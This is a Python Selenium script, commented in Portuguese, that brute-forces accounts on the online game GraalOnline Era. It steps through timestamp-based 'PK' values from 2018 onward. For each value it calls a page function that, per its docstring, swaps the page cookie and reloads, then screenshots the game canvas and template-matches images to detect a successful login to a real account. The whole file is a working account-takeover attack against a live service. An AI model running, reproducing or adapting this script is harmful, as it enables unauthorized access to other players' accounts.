from  mydriver import MyDriver
from time import sleep
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
import os
from mydriver import MyDriver
import random
import time
import numpy as np
from PIL import Image
import io
import cv2

class Graal:

    def __init__(self):
        """
        Configurações básicas
        """
        self.mydriver = MyDriver(not_window=False)
        self.driver = self.mydriver.driver
        self.link_jogo = "https://era.graalonline.com"
        self.actions_chains = ActionChains(self.driver)
        self.runLoop = True

    def abrir_jogo(self):
        """
        Para abrir página do jogo pela primeira vez
        """
        self.driver.get(self.link_jogo)
        WebDriverWait(self.driver, 300).until(EC.presence_of_element_located((By.ID, 'unity-canvas')))
        self.driver.execute_script("console.log('apareceu')")        

    def apertar_enter(self):
        """
        Especifico para usar na def brut()
        Responsável por apertar na tecla ENTER
        """
        self.actions_chains.key_down(Keys.ENTER).perform()
        time.sleep(0.09)
        self.actions_chains.key_up(Keys.ENTER).perform()

    def pk_operation(self, pk: str, valor=1, operacao: str ='somar'):
        """
        Retorna pk com a soma ou subtracao
        @param pk = PK
        @param valor = Valor que será somado ou subtraído ao PK
        @param operacao = 'somar' ou 'subtrair'
        """
        new_pk = pk.split('.')
        new_pk[1] = str(int(new_pk[1]) + valor)
        if str(new_pk[1]) == str('1000000000'):
            new_pk[1] = str(new_pk[1])[1:]
            new_pk[0] = str(int(new_pk[0]) + 1)
        result = f"{new_pk[0]}.{new_pk[1]}"
        return result

    def filtros(self, pk):
        # Se tiver filtros, colocar aqui. Return False para não testar a pk atual
        return True

    def this_img_in_canvas_img(self, img_path, threshold=0.7):
        """PNG
        Verifica se uma imagem existe dentro do canvas
        """
        canvas = self.driver.find_element(By.ID, 'unity-canvas')
        canvas_screenshot = canvas.screenshot_as_png
        canvas_image = Image.open(io.BytesIO(canvas_screenshot))
        canvas_image_cv = np.array(canvas_image)
        canvas_image_cv = cv2.cvtColor(canvas_image_cv, cv2.COLOR_RGB2BGR)
        template = cv2.imread(img_path)
        result = cv2.matchTemplate(canvas_image_cv, template, cv2.TM_CCOEFF_NORMED)
        threshold = threshold
        locations = np.where(result >= threshold)
        if len(locations[0]) > 0:
            # Imagem encontrada
            return True
        else:
            return False


    def verificar_login(self, pk):
        # Verifica se foi encontrado uma conta real
        if self.this_img_in_canvas_img('img/list.png') == True:
            return False
        elif self.this_img_in_canvas_img('img/btn-mudar.png') == True:
            return True
        elif self.this_img_in_canvas_img('img/btn-identificar.png') == True:
            return True
        elif self.this_img_in_canvas_img('img/gunimage.png') == True:
            return False

        


    def brut(self, pk:str):
        """
        Responsável por alterar o cookie da página e dar reload na página,
          em conjunto com a tecla enter para clicar em 'retry'
        """
        pk = pk
        self.driver.execute_script(f"brut('{pk}')")
        time.sleep(0.03)
        self.apertar_enter()


    def run(self, pk_inicial:str='1514764800.100000000', operation='somar'):
        """
        PK/Contador inicial está no primeiro dia de 2018
        @param operation = 'somar' ou 'subtrair'
        """
        self.abrir_jogo()

        pk = pk_inicial

        while self.runLoop == True:

            if self.filtros(pk) == True:
                self.brut(pk)
                self.verificar_login(pk)
            pk = self.pk_operation(pk, 1, 'somar') #  Deixar sempre no fim do loop
   




graal = Graal()
graal.run()

print('debug')


